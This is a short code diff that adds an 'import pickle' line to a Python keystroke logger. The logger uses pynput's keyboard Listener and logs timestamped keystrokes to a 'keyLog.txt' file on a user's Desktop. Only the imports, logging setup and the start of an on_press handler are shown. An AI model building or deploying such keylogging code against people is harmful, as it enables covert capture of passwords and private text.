@@ -1,5 +1,6 @@
 from pynput.keyboard import Key, Listener
 import logging
+import pickle
 log_dir = r"C:/Users/AMIT/Desktop/"
 logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 def on_press(key):
